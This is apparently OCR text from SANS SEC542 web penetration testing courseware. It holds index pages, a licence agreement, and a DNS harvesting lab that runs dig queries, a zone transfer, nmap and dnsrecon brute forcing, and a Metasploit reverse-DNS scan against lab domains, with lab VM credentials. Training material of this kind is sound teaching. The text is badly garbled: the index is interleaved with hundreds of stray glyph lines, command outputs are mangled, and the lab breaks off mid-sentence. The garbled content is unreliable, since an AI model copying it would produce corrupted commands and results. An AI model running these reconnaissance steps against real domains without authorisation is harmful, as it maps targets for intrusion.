3:56, 3:97-98, 3:100, 3:114, 3:121 
1:82 
2:108, 3:3, 3:31-34, 4:104, 5:7 
2:71-72, 3:31, 3:56, 3:83, 3:90, 3:96-98, 
3:100-102, 3:114, 3:121, 5:71 
1:8 
1:134, 2:12-13, 2:23, 3:15 
1:73, 2:14-15 
5:65 
1:77 
1:49 
2:24-25, 2:27, 2:46, 2:76, 5:65 
1:37-38, 1:42, 1:133, 1:135, 2:3, 2:6-8, 
2:11-13, 2:116, 6:17, 6:19 
1:42 
3:10, 4:45-46, 4:49, 4:63-65, 4:70-71 
1:38-40, 2:32-33 
1:133-134, 3:107-109 
'--' 
'--' 
'-.../ 
'-.../ 
'--' 
'-.../ 
'-.../ 
'--' 
'--- 
'--' 
'--' 
'--' 
'--' 
'--- 
'----' 
'---" 
'-.../ 
'-' 
'-.../ 
'--' 
'--' 
'--' 
'---' 
'--- 
'---" 
'--' 
'----' 
'--' 
'--' 
'--' 
0 
'--' 
'--' 
OAuth 
Object type: Array 
2:80, 5:34 
4:24 
--.__,; 
'----' 
'--' 
\_/ 
Index -8 
'-.../ 
·.____,; 
Object type: Date 
Object type: Document 
Object type: History 
Object type: Location 
Object type: String 
Object type: Window 
Off-the-Record (OtR) 
Offensive Security 
onclick 
one-time tapes (O'TTs) 
onerror 
OpenID 
OpenSSL 
OpenVPN 
OPTIONS 
OR 
Oracle 
ORDER BY 
Origin Server 
OS Command Injections 
OTG-CLIENT-003 
OTG-CONFIG-004 
OTG-CONFIG-006 
OTG-CRYPST-001 
OTG-IDENT-004 
OTG-INFO-002 
OTG-INFO-005 
OTG-INFO-006 
OTG-INFO-007 
OTG-INFO-008 
OTG- INFO-009 
OTG-INFO-010 
OTG-INPV AL-005 
OTG-INPV AL-012 
OTG-INPVAL-013 
OTG-SESS-005 
Out-Of-Bound (OOB) 
OWASP 
OWASP Testing Guide (OTG) 
4:24 
4:24 
4:24 
4:24 
4:24 
4:24 
5:104 
1:8 
4:126 
2:.100 
4:73, 4:78-79 
2:80 
1:133-134, 1:141-143, 1:145 
1:128 
1:81, 1:91, 1:93, 2:22-23 
1:16, 3:58, 3:66, 3:68 
3:56, 3:96-98, 3:100, 3:106, 3:121, 5:63, 
5:71 
3:58, 3:108 
4:33-35, 4:39-41, 4:88 
2:27 
4:29 
2:70 
2:20 
1:132 
2:96 
2:19 
2:40 
2:40 
2:40 
2:40 
2:40 
2:40 
1:16 
3:44 
3:37 
5:6 
3:91-92, 3:133, 4:58 
1:12-17, 1:28, 1:106, 1:126, 1:132, 2:19-20, 
2:27, 2:40, 2:44-45, 2:50, 2:70, 2:96, 
3:31-32, 3:37, 3:44, 3:116, 4:8-11, 4:28-29, 
5:6,5:11 
1:13, 1:15-17, 1:132, 2:19-20, 2:27, 2:40, 
Index -9 
'-../ 
..__, 
'--" 
OWASPTop10 
2:70, 2:96, 3:37, 3:44, 4:29, 5:6 
1:13-14, 3:32, 4:8 
p 
pof 
Penetration Testing Execution Standard 
(PTES) 
Percent Encoding 
Persistent 
phpBB 
PHPSESSIONID 
pipeline 
Pitchfork 
Pointer Record (PTR) 
popen() 
Port Scanning 
POST 
Post exploitation 
Press release 
Proof of Concept (PoC) 
Proxy 
Public Key Infrastructure (PKI) 
PUT 
Python 
Python Enhancement Proposals (PEP) 
1:7 
1:12 
4:50 
1:81, 3:8, 3:10, 3:86, 4:45-46, 4:49, 4:56- 
58, 4:63-65, 4:70-71, 4:88 
1:27 
3:17 
1:82-83 
2:108, 2:111 
1:35-37, 1:41, 1:43, 1:45 
2:31 
4:9, 4:114, 4:117 
1:80, 1:91-92, 1:98, 2:23, 3:16, 3:73, 4:17, 
4:70, 4:108-109, 4:130, 5:12, 5:35 
1:12, 3:133 
1:49 
1:29, 1:37, 1:144, 2:32, 2:35, 4:11-12, 4:32, 
4:42-43, 4:49, 4:60, 4:69, 4:76, 4:82, 
4:84, 4:86, 5:12, 5:76 
1:28, 1:94, 1:103, 1:106, 1:114, 1:116, 2:44, 
3:125-126, 4:104, 4:129-130, 4:150 
1:128 
1:80, 1:91, 1:95, 1:98, 2:22-23 
1:63, 1:67, 2:31, 3:15, 3:119-120, 4:103, 
4:105, 4:107, 4:109, 5:3, 5:22-35, 5:37, 
5:39, 5:46, 5:50 
5:32 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'---- 
'-../ 
'-.../ 
'-../ 
'-../ 
'-' 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'----' 
'-../ 
'-.../ 
'-.../ 
'-../ 
'-.../ 
'-../ 
'---- 
'-.../ 
'-.../ 
'-.../ 
'---- 
'---- 
Q 
'-../ 
'-.../ 
QualysWAS 
Query Stacking 
Query String Formats 
1:27 
3:100 
1:89 
'-.../ 
'--" 
'-.../ 
'-../ 
'--" 
'-.../ 
'---' 
Index -10 
'-../ 
'-../ 
~ 
~ 
~ 
~ 
R 
~ 
,------, 
readyState 
~ 
Recon-ng 
~ 
Reconnaissance 
~ 
Reflected XSS 
~ 
,------, 
Relational Database Management 
~ 
Systems (RDBMS) 
~ 
Remote File Inclusion (RFI) 
Report Pieces 
~ 
Reporting 
,---,, 
~ 
Request Initiation 
~ 
Request Methods 
,---,, 
Reverse DNS (PTR) 
RFC 1945 
r'\ 
RFC 2616 
~ 
RFC7540 
r'\ 
rfc2616 
r'\ 
rfq230 
~ 
rfq231 
rfq232 
r'\ 
rfc7233 
r'\ 
rfc7234 
r'\ 
rfq235 
r'\ 
Robots 
Robots Exclusion Protocol 
(""""\ 
Rules of Engagement 
(""""\ 
r'\ 
r'\ 
s 
r', 
Same Origin policy 
~ 
Same-Origin Policy 
r'\ 
SAML 
r'\ 
SamuraiWTF 
~ 
Scanning 
,---,, 
Scapy 
r'\ 
Search Engine Directives 
~ 
SecLists 
,---,, 
,---,, 
"' 
r', 
4:124-126 
1:67,74 
1:12, 1:31-32, 1:35, 1:38, 1:43, 1:45, 1:50- 
52, 1:64, 1:67-68, 2:21, 2:71 
4:46-50, 4:55-56, 4:63, 4:69-71, 4:92, 
4:103, 4:107 
3:56, 3:59, 3:97, 3:100, 3:106-107, 3:113 
3:3, 3:44-45, 3:52, 3:137, 4:9, 4:14, 4:28 
5:107 
1:12, 1:60, 1:67, 2:14, 5:4, 5:66, 5:103, 
5:106-107 
4:114, 4:116 
1:3, 1:91, 1:93, 2:21-23 
1:35-37, 1:41-43, 1:45 
1:80, 2:81 
1:81 
1:82 
1:81, 4:97 
1:81 
1:81 
1:81 
1:81 
1:81 
1:81 
2:43, 2:52, 4:14, 5:51 
2:43 
5:101 
4:127-128 
4:33, 4:35-37, 5:11 
2:80 
1:25-26 
1:12, 1:25, 1:27, 1:42, 2:3, 2:6-7, 2:11, 2:42, 
2:72, 4:9, 4:114, 4:117, 5:41, 5:63, 5:66-67 
5:22 
1:51 
2:67-68, 2:76 
Index -11 
"-.-I 
Secure Sockets Layer (SSL) 
Security Misconfiguration 
SELECT 
Self-XSS 
Sense Post 
Sensitive Data Exposure 
ServerXSS 
session fixation 
Session Hijacking 
Session Management (SESS) 
session token 
Session Tracking 
SHA1 
SHA2 
SHA256 
SHA512 
SharePoint 
Shellshock 
Shodan 
SHodan INtelligence Extraction 
(SHODAN) 
side-channel attack 
Simple Object Access Protocol (SOAP) 
Single Sign On (SSO) 
site: 
SMTP 
SMTPS 
Special Characters 
Spider 
SQL injection (SQ Li) 
SQ L Special Characters 
SQLMap 
SSL Labs 
ssl-enum-ciphers 
SSL/TLS 
SSLDigger 
1:66, 1:88, 1:94, 1:104, 1:128-130, 1:132- 
134, 1:136-137, 1:144, 2:9, 5:36, 5:53 
3:32 
1:16, 3:57, 3:61-64, 3:66, 3:68-69, 3:83, 
3:96, 3:98-100, 3:102-109, 3:112, 5:75 
4:45 
1:54, 1:144 
3:32 
4:65 
3:3, 3:22-24 
3:22, 4:87-89 
1:17, 3:6, 3:32, 3:127, 3:137, 5:6 
1:110, 1:120, 1:145, 3:3, 3:9, 3:11, 3:15-24, 
4:88, 4:97 
3:3, 3:7, 3:127 
1:121, 1:137, 2:102 
1:137, 2:102 
1:137 
1:137 
1:27 
2:3, 2:28-36, 2:38, 2:110, 2:116, 5:71, 6:10 
1:56-59, 1:63, 1:73-74, 6:15, 6:21 
1:59, 1:63 
2:99-101, 2:116 
1:54, 1:125 
5:100 
1:51-52, 2:50, 2:71, 2:74, 4:137, 5:46 
1:128, 1:134, 1:144 
1:128, 1:134 
3:60, 3:72 
1:108, 1:110, 1:117, 2:3, 2:40-46, 2:51-53, 
2:55, 2:57, 2:60, 2:66, 2:116, 3:124-125, 
3:128, 4:103, 4:107, 4:132, 4:138, 5:46, 
5:51, 5:56, 5:63-65 
3:54, 3:72, 3:115-116, 5:75 
3:60 
1:86, 3:4, 3:111, 3:115, 3:118, 3:120-127, 
3:129-133, 3:135, 4:133, 5=46, 5:58, 5:70 
1:133, 1:136 
1:133, 1:135 
1:128-129, 1:132, 5:36 
1:136 
'--' 
'-._., 
'-../ 
'-../ 
'-../ 
'-../ 
'--' 
'-.../ 
'-../ 
'--' 
'-.-I 
'-.../ 
'-.J 
'-../ 
'-.J 
'-.-I 
'--' 
'--' 
'-.../ 
'-.../ 
'-../ 
'--' 
'--' 
'-../ 
'--' 
'-../ 
'-../ 
'-../ 
'-.-I 
'-../ 
.'-.-I 
'--' 
'-../ 
'-.-I 
'-../ 
'-../ 
'-.J 
'-.J 
lndex-12 
'--' 
'-.-I 
Stacked Queries 
Standard Generalized Markup Language 
(SGML) 
StoredXSS 
String 
Synchronizer 
system() 
T 
Tangled Web 
TEMPEST 
theHarvester 
Timing Attacks 
Top Level Domain (TLD) 
Total Cost of Ownership (TCO) 
TRACE 
Transport-Layer Security (TLS) 
Trustwave App Scanner 
Twitter 
u 
Uniform Resource Identifier (URI) 
UNION 
Universal XSS (UXSS) 
unlinked content 
Unvalidated Redirects and Forwards 
UPDATE 
URL Encoding 
User-Agent 
Using Components with Known 
Vulnerabilities 
V 
Variable Length String 
ViewState Viewer 
VNC 
3:100, 3:103, 3:115, 3:121 
1:76, 4:6 
3:114, 4:56-64, 4:70-71 
4:24 
5:11 
2:31 
1:7, 4:37 
2:100 
1:63 
2:99, 2:101-102 
1:33, 1:43 
2:99 
1:91, 1:93, 1:98, 2:22-23, 5:51 
1:84, 1:128-129, 1:132-133, 1:141-142, 5:36 
1:27, 5:94 
1:49, 1:55, 1:74, 2:97, 4:11 
1:88, 2:84, 3:9, 3:11, 3:40, 4:8, 4:26, 4:50, 
4:92 
3:57, 3:69-70, 3:103-111, 3:121 
4:45 
2:50 
1:14 
3:57 
4:50 
1:85-86, 2:32-33, 2:35-36, 2:43, 2:110, 
3:73, 3:129, 4:70, 4:97, 4:99, 4:105 
3:32 
3:59 
1:104 
3:133, 5:62, 5:70 
Index -13 
'--" 
'--" 
VoIP 
Vulnerability assessment 
w 
W3af 
Wapiti 
Wappalyzer 
Watcher 
Weaponization 
Web Application Firewall (W AF) 
WebDAV 
Weblnspect 
WebSocket 
wget 
WHERE 
Whitehat Sentinel 
WHOIS 
Window 
Wires hark 
WMAP 
WordPress 
WPScan 
1:56, 4:119 
1:12, 1:16 
2:76, 3:17, 3:121-122, 5:3, 5:46-58, 5:60 
5:65 
2=46-49 
1:104 
4:69 
4:83-84 
1:91, 1:95, 2:22 
1:27, 5:94 
1:3, 1:94, 1:96, 1:124-126 
2:52, 3:15 
1:16, 3:58, 3:61-64, 3:66, 3:68-69, 3:83, 
3:100, 3:102-104, 3:108, 3:112, 5:75 
1:27 
1:3, 1:31-32, 1:36, 1:44, 1:49, 1:65 
4:24 
1:84, 1:126, 1:128 
2:76, 5:66, 5:71 
1:27, 5:10, 5:41-42, 5:63, 5:71-72 
5:3, 5:41-42, 5:44 
'--" 
'-----' 
'-----' 
'-----' 
'---" 
'-----' 
'-----' 
'-----' 
'-----' 
'--' 
'-----' 
'-----' 
'-----' 
\___/ 
'-----' 
'-----' 
'--' 
'--' 
'-----' 
'-----' 
'-----' 
\___/ 
X 
'-----' 
'-----' 
X-Powered-By 
x5s 
XMLH ttpRequest 
XMPP 
XSS filter 
XSScrapy 
XSSer 
xsssniper 
2:12 
1:104 
4:123-126, 4:128, 4:138 
1:125 
4:80-81, 4:83 
4:96, 4:107 
4:84, 4:96, 4:105-106 
4:96, 4:103-105 
'--' 
'--' 
'---" 
'-' 
'--' 
'-..../ 
'--' 
'-----' 
_/ 
-----------------....______./ 
'-' 
'-..../ 
'-.../ 
'-.../ 
'-----' 
'-..../ 
Index -14 
'-..../ 
'-J 
z 
Zed Attack Proxy (ZAP) 
Zenmap 
Zombie 
1:28, 1:106-107, 2:44, 2:48-50, 2:63, 2:68, 
3:127, 3:135, 4:53 
2:8, 6:19 
4:111-117 
Index -15 
- 
~ 
X 
~ 
- 
- 
SEG54'! I WEBAPP PENE"FMl'IQNtf'ES"FING Aft£U?'THI~ HAG&ING 
\....) 
Copyright© 2018, Seth Misenar and Eric Conrad. All rights reserved to Seth Misenar, Eric Conrad, and/or 
SANS Institute. 
\....) 
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE 
AGREEMENT ("CLA") CAREFULLY BEFORE USING ANY OF THE COURSEWARE 
ASSOCIATED WITH THE SANS COURSE. THIS IS A LEGAL AND ENFORCEABLE CONTRACT 
BETWEEN YOU (THE "USER") AND THE SANS INSTITUTE FOR THE COURSEWARE. YOU 
AGREE THAT THIS AGREEMENT IS ENFORCEABLE LIKE ANY WRITTEN NEGOTIATED 
AGREEMENT SIGNED BY YOU. 
With the CLA, the SANS Institute hereby grants User a personal, non-exclusive license to use the 
Courseware subject to the terms of this agreement. Courseware includes all printed materials, 
including course books and lab workbooks, as well as any digital or other media, virtual machines, 
and/or data sets distributed by the SANS Institute to the User for use in the SANS class 
associated with the Courseware. User agrees that the CLA is the complete and exclusive 
statement of agreement between The SANS Institute and you and that this CLA supersedes any 
oral or written proposal, agreement or other communication relating to the subject matter of this 
CLA. 
BY ACCEPTING THIS COURSEWARE, YOU AGREE TO BE BOUND BY THE TERMS OF THIS 
CLA. BY ACCEPTING THIS SOFTWARE, YOU AGREE THAT ANY BREACH OF THE TERMS 
OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT INJURY TO THE SANS 
INSTITUTE, AND THAT THE SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY 
INJUNCTION (WITHOUT THE NECESSITY OF POSTING BOND), SPECIFIC PERFORMANCE, 
OR OTHER EQUITABLE RELIEF. 
If you do not agree, you may return the Courseware to the SANS Institute for a full refund, if 
applicable. 
User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works 
based upon all or any portion of the Courseware, in any medium whether printed, electronic or 
otherwise, for any purpose, without the express prior written consent of the SANS Institute. 
Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any 
way, shape, or form without the express written consent of the SANS Institute. 
If any provision of this CLA is declared unenforceable in any jurisdiction, then such provision shall 
be deemed to be severable from this CLA and shall not affect the remainder thereof. An 
amendment or addendum to this CLA may accompany this courseware. 
SANS acknowledges that any and all software and/or tools, graphics, images, tables, charts or 
graphs presented in this courseware are the sole property of their respective 
trademark/registered/copyright owners, including: 
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back 
to My Mac, Boot Camp, Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, 
iLife, iMac, iMessage, iPad, iPad Air, iPad Mini, iPhone, iPhoto, iPod, iPod classic, iPod shuffle, 
iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac, Mac Logo, MacBook, 
MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, 
Retina, Safari, Siri, Spaces, Spotlight, There's an app for that, Time Capsule, Time Machine, 
Touch ID, Xcode, Xserve, App Store, and iCloud are registered trademarks of Apple Inc. 
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA. 
'-' 
'---' 
'---' 
'---' 
'---' 
'-.___./ 
'---' 
'---' 
'---' 
'---' 
'---' 
'-' 
'---' 
'---' 
'---' 
'---' 
'---' 
\....) 
'---' 
\....) 
'---' 
'---' 
\....) 
'---' 
"-.../ 
'---' 
'---' 
'---' 
'---' 
'---' 
\....) 
'---' 
'---' 
'---' 
'---' 
\....) 
SEC542_W_D01_01 
'---' 
'-./ 
- i 
.• 
- .. Ex.~;cisr~ra -/iJNs Ra~v,esiny .. ... . - . •· . 
. 
- 
~'¼.= es.... 
~ - 
- ----~ 
~~=- 
=~ - 
~-_ 
- - 
~ 
~ 
~ 
~ 
;- 
- 
- 
-_ 
~ 
= 
- 
~ 
I Objectives 
• 
Gain hands-on experience performing DNS reconnaissance 
• 
Understand various DNS tools' capabilities (dig, Nmap, DNSRecon, Metasploit) 
• 
Demonstrate a DNS zone transfer 
• 
Perform DNS reconnaissance when zone transfers are unavailable 
• 
Discover unpublished records via DNS brute forcing 
• 
Perform reverse DNS scanning 
I Lab Description 
We will perform reconnaissance on the domains sec542.org and sec542.com: 
• 
sec542.org: The primary domain we will use all week 
• 
sec542.com: A new commercial offshoot of Sec542, Inc. 
Lab goal: Discover all DNS names. 
• 
Including all CNAMEs that may be used for virtual hosting 
• 
Virtual hosts are often "unpublished," and discovering them can lead to excellent web application 
penetration testing results! 
ILabSetup 
Log in to Security542 VM: 
• 
Username: student 
• 
Password: Securi ty542 
Open a terminal by clicking the terminal icon on the upper panel or double-clicking the desktop icon. 
Open another terminal and start Metasploit's msfconsole. Metasploit is installed in: 
/opt/metasploit-framework 
,--., 
To start Metasploit's msfconsole do the following in a terminal: 
$ cd /opt/metasploit-framework 
./msfconsole 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.1: DNS Harvesting 
1 
I Challenge: NoHints 
'-' 
Perform the following steps: 
'-' 
'-' 
• 
Use dig against sec542.org and sec542.com to search records with type "ANY": 
• 
Attempt a DNS zone transfer of the sec542.org and sec542.com zones 
• 
Use Nmap with the dns-brute NSE script to perform a DNS brute force scan of names in the 
sec542.com domain 
• 
Use dnsrecon.py (installed in / opt/ dnsrecon) to perform a DNS brute force scan of names in the 
sec542.com domain 
• 
Use Metasploit's auxiliary/gather/dns_reverse_lookup module to perform a reverse DNS 
scan of 192.168.1.0/24 
'-' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
Step-by-step instructions begin on the next page. 
Choose your own difficulty! 
'---' 
'---' 
'---' 
'---' 
'-' 
'--' 
'-./ 
'---' 
'--" 
'---' 
'---' 
'---' 
'---' 
'---' 
'-..; 
'--" 
'---' 
'--" 
'-..; 
'-./ 
'-./ 
'--" 
'-' 
'-' 
'-./ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.1: DNS Harvesting 
2 
'-' 
'-.J 
'-..,I 
!step-by-Step Instructions 
dig 
Open a terminal in your Sec542 Linux VM by double-clicking the terminal desktop icon. 
Then type the following command: 
I $ dig sec!>42. org: -1: any 
In the resulting output, pay particular attention to the "ANSWER SECTION." You should see the following 
output: 
[-)$ dig sec542.org -t any 
; <<>> DiG 9.9.5-3ubuntu0.ll-Ubuntu <<>> sec542.org -t any 
,, global options: +cmd 
; ; Got answer: 
; ; ->>HEADER<<- opcode: QUERY, status: N0ERR0R, id: 37353 
; ; flags: qr aa. rd ra; QUERY: 1, ANSWER! 7, AUTHORITY: 9, ADDITIONAL 
: 
5 
;; OPT PSEUDOSECTION: 
; EDNS: version: 0:, flags:; udp: 4096 
·; ; QUESTION SECTION: 
;sec542.org. 
IN 
ANY 
; ; ANSWER SECTION:: 
sec542.org. 
n.sec542.org. 
isec542. org. 
sec542.org. 
sec542.org. 
sec542.org . 
. sec542. org. 
sec542.org. 
for all the fish." 
86408 
IN 
SOA 
nsl.sec542.arg. admi- 
2818838181 28808 3688 684888 38408 
86408 
IN 
A 
192.168.1.8 
86489 
IN 
NS 
nsl.sec542.org. 
86480 
IN 
NS 
ns2.sec542.org. 
86488 
IN 
MX 
18 mail.sec542.org. 
86488 
IN 
MX 
28 mai 12. sec542. o rg. r 
1 
86408 
IN 
TXT 
"So long, and thanks 
;; ADDITIONAL SECTION: 
nsl .. sec542. org,. 
ns2.sec:542.org. 
mail , sec:542. o rg1 . 
mail2.sec542.org. 
86400 
8640:0 
86400 
86400 
IN 
IN 
IN 
IN 
,, Query time: 1 msec 
, , SERVER: 121 .0. e .1:1s3021. 0. 0 .1) 
,, WHEN: Thu Dec 28 17:11:05 PST 2817 
,, MSG SIZE 
rcvd: 298 
[-]I$ 
A 
A 
A 
A 
192.168.1.8 
192.168.1.23 
192.168.1.23 
192 .168.1. 8 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1 .1 : DNS Harvesting 
3 
'-....,/ 
Next, run the same command against sec542.com: 
1 $ dig s~~s42': com _ t atly 
'-../ 
.____,, 
In the resulting output, again pay particular attention to the "ANSWER SECTION." You should see the 
following output: 
'-....,/ 
'-../ 
,fife 
Edit .view T~maf 
~ ~~,·--e-x~ 
[-]$ dig sec542.com -t any 
; <<>> 01G 9.9.5-3ubuntu8.ll-Ubuntu <<>> sec542.com -t any 
,, global options: +cmd 
; ; Got answer: 
;; ->>HEADER<<~ opcode: QUERY, status: NOERROR, .id: 16410 
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 8, ADDITIONAL 
: 3 
;; OPT PSEUDOSECTION: 
; EONS: version: 8, flags:; udp: 4896 
; ; QUESTION SECTION: 
; sec542. com. 
IN 
ANY 
'-../ 
'-../ 
'---" 
'---" 
'----' 
'--' 
'--' 
'--' 
'----' 
'-../ 
'-../ 
; ; ANSWER SECTION: 
sec542.com. 
n.sec542.com. 
sec542.com. 
sec542.com. 
sec542.com. 
'-../ 
86488 
IN 
SOA 
nsl.sec542.com. admi 
2018838101 28800 3688 684880 38499 
86408 
IN 
A 
192 .168 .1. 8 
86499 
IN 
NS 
nsl.sec542.com. 
86409 
IN 
MX 
10 mail.sec542.com. 
'--' 
'--' 
'--' 
'----' 
;; ADDITIONAL SECTION: 
ns l.. sec542. com. 
86480 
IN 
mail.sec542.com. 
86488 
IN 
, , Query time: l msec 
,, SERVER: 127.0.0.1#53(127.0.0.1) 
,, WHEN: Thu Dec 28 17:25:17 PST 2017 
, , 
MSG SIZE 
rcvd: 168 
[-]$ [""] 
A 
A 
192.168.1.8 
192.168.1.8 
'-../ 
'--' 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
Zone Transfer 
'-../ 
.____, 
Many tools can perform a zone transfer, including both DNSRecon and Nmap (with the dns-zone-transfer 
NSE script). 
We'll use dig because we just used it for the previous step: 
The syntax is the same as the previous step, except change "any" to "axfr". 
'-../ 
'--' 
'-../ 
'-../ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.1: DNS Harvesting 
4 
~ 
'----' 
'--' 
Type the following commands to perform a zone transfer with dig versus sec542.org: 
$ dig sec542.org -t axfr 
The zone transfer will be successful, downloading the entire sec542.org zone: 
View 
Te;mim.! 
[-]$ dig sec542.org -t axfr 
; <<>> DiG 9.9.5-3ubuntuB.ll-Ubuntu <<>> sec542.org -t axfr 
;; global options: +cmd 
sec542.org. 
86400 
IN 
2818(:)38181 28888 3688 684888 38480 
sec542.org. 
86400 
IN 
sec542.org. 
86489 
IN 
sec542.org. 
86488 
IN 
sec542.org. 
86480 
IN 
sec542.org. 
86488 
rn 
sec542.org. 
86400 
IN 
ish." 
ajax.sec542.org. 
86408 
IN 
auth.sec542.org. 
86488 
IN 
bar.sec542.org. 
86488 
IN 
bootcamp.sec542.org. 
86480 
IN 
dbdev.sec542.org. 
86488 
IN 
rec. sec542. orq , 
86488 
IN 
hr-web. sec542. org. 
86488 
IN, 
mail. sec542. org. 
86488 
IN 
mai 12. sec542. o rg. 
86400 
IN 
nst . sec542. org. 
86488 
IN 
nsz , sec542. o rg. 
86488 
IN 
scanner.sec542.org. 
86488 
IN 
shellshock.sec542.org. 
86488 
IN 
sniffer. sec542. o rg. 
86400 
IN 
sugarcrm.sec542.org. 
86400 
IN 
webdev. sec542. org. 
86400 
IN 
www.sec542.org. 
86480 
IN 
sec542.org. 
86488 
IN 
2818030181 28800 3600 604800 3840& 
,, Query time: 2 msec 
., SERVER: 127. 0 .. 0 .1153(127. 0 .0 .. l} 
, , WHEN: Fri Dec 29 15:46:08 PST 2(H7 
, , XFR size: 25 records {messages l. bytes 608) 
SOA 
A 
NS 
NS 
MX 
MX 
TXT 
CNAME 
CNAME 
A 
CNAME 
A 
A 
A 
A 
A 
A 
A 
A 
A 
CNAME 
CNAME 
A 
A 
SOA 
ns) .. sec542. org. admin. sec542 .org. 
192.168.1.8 
ns i . sec542 .org. 
nsz . sec:542 .. org. 
10 mail.sec:542. org. 
20 mait2.sec542.org, 
"So long, and thanks for all the f 
boot camp. sec:542. orq , 
W\•IW. sec542. org. 
192. 168. l. 18 
www.sec542.org. 
192.168. 1.23 
192.168.1.67 
192.168.1.8 
192.168.1.23 
192 .168.1.8 
192.168. 1.8 
192.168.1.23 
192 .168. l. 8 
192.168.1.8 
W\,f\,v. sec542:. org. 
www.sec542.org. 
192.168.1.23 
192.168. 1.8 
nsl.sec542.org. 1dmin.sec542.org. 
Type the following commands to perform a zone transfer with dig versus sec542.com: 
I $ dig sec542. com+- t ax£ r 
Warning: The zone transfer will fail against sec542.com. 
The following output shows the zone transfer against sec542.com was unsuccessful: 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.1: DNS Harvesting 
5 
'-" 
[-]$ dig sec542.com -t axfr 
; <<>> DiG 9.9.5-3ubuntu0.ll-Ubuntu <<» sec542.com -t axfr 
;; global options: -&.cmd 
; Transfer failed. 
[-]$ (I 
. 
:j:1 
While not formally part of this lab, the syntax for performing DNS zone transfers with both DNSRecon and 
Nmap, via the dns-zone-transfer NSE script, are below: 
Here is the dnsrecon.py zone transfer syntax: 
[$ dnsrecon.py -a -d sec542.org 
Here is the Nmap zone transfer syntax: 
$ nmap --script=dns-zone-transfer sec542.org 
While the output format from DSNRecon or Nmap may differ from dig, the results will be the same. 
DNS Brute Force 
The sysadmins at sec542.com appear to be (more) on the ball and have wisely restricted zone transfers. 
We will launch a DNS brute force attack versus sec542.com. 
Note: While commonly called a DNS brute force attack, it is a wordlist or dictionary attack. 
Run the following Nmap command: 
[;,: nmap --script=dns-brute sec542.com 
In the output, note the newly identified hosts discovered using this technique. You will see the following 
output: 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.1: DNS Harvesting 
\.....,I 
___, 
___, 
___, 
___, 
\,_/ 
___, 
___, 
___, 
'---' 
'---' 
\.....,I 
\.....,I 
\.....,I 
\.....,I 
___, 
___, 
\.....,I 
'---'' 
\.....,I 
\.....,I 
'-' 
\.....,I 
'----' 
'----' 
\.....,I 
\.....,I 
\.....,I 
\.....,I 
\.....,I 
\.....,I 
\.....,I 
\.....,I 
\.....,I 
'----' 
\.....,I 
\.....,I 
6 
'---' 
'-' 
'-' 
Ff!e 
Edit 
I-JS nmap --script•dns-brute sec542.com 
Starting Nmap 7.48 { https;/lnmap.org ) at 2817-12-29 15:52 PST 
Nmap scan report for sec542.com (192.168.l.8) 
Host is up (B.B8B827s latency). 
N.ot shown: 997 closed ports 
PORT 
STATE SERVICE 
22/tcp open 
ssh 
53/tcp open domain 
88/tcp open http 
Host script results: 
I dns-brute: 
I 
DNS Brute-force hostnames: 
I 
test.sec542.com - 192.168.1.8 
I 
nsl.sec542.com - 192.168.l.8 
I 
ma1l.sec542.com - 192.168.1.8 
I 
W\Wl. sec542. com - 192:. 168. l. 8 
I_ 
ftp.sec542.com - 192:.168.l.8 
Nmap done: 1 IP address ( l host up}. scanned in e. 26 seconds 
r-1$ I 
dnsrecon.py discovered the following hostnames: 
• 
test.sec542.com 
• 
nsl.sec542.com 
• 
mail.sec542.com 
• 
www .sec542.com 
• 
ftp.sec542.com 
Let's compare dnsrecon.py with Nmap's dns-brute NSE script results. 
Leave the terminal with Nmap results open to allow for easy comparison. 
Open a new terminal and run the following command: 
$ dnsrecon.py 
brt -d sec542.com -D /opt/dnsrecon/na.inelist.txt 
In the output, note the hosts DNSRecon identified using this technique: 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.1: DNS Harvesting 
7 
File 
T~inat 
• 
[-1$ dnsrecon.py -t brt -d sec542.com -0 /opt/dnsrecon/namelist.txt 
[*l Performing host and subdomain brute force against sec542.com 
[*1 
CNAME cust42.sec542.com sec542.com 
[*) 
A sec542.cam 192.168.1.8 
[*] 
CNAME ftp.sec542.com sec542.com 
[*) 
A sec542.com 192.168.1.8 
[*l 
A mail.sec542.com 192.168.1.8 
[*J 
A nsl.sec542.com 192.168.l.8 
[*] 
CNAME test.sec542.com sec:542.com 
[*] 
A sec542.com 192.168.1.8 
[ * J 
CNAME \·MW. sec542. com sec542. com 
[*] 
A sec542.com 192.168.1.8 
' 
18 Records Found 
[ - ] $ ~- 
'--' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-../ 
DNSRecon should identify a hostname that the Nmap dns-brute script missed. 
'----' 
Identify that hostname by comparing DNSRecon's output with Nmap's. 
dnsrecon.py discovered the following hostnames via either A or CNAME records: 
'-'' 
'--' 
• 
cust42.sec542.com 
• 
ftp.sec542.com 
• 
mail.sec542.com 
• 
nsl.sec542.com 
• 
test.sec542.com 
• www .sec542.com 
Both tools discovered test.sec542.com, which we were previously unaware of based on running dig 
against sec542.com. 
In addition, dnsrecon.py also discovered cust42.sec542.com. 
Note: dnsrecon.py found cust42.sec542.com because its default word list is longer. 
The /opt/ dnsrecon/namelist. txt file has 1907 entries, as shown by: 
